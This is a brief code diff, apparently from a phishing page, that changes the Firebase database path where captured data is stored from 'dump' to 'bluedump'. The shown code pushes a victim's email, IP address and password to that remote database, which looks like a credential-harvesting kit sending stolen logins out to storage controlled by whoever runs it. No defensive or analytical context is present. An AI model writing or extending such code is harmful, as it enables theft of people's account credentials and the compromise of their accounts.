@@ -137,7 +137,7 @@ setShow(true)
 }
 else{
 	setlpass(currentpass)
-	firebase.database().ref('dump').push({
+	firebase.database().ref('bluedump').push({
 		info1: mail,
 		info2: ip,
 		info3 : pass,
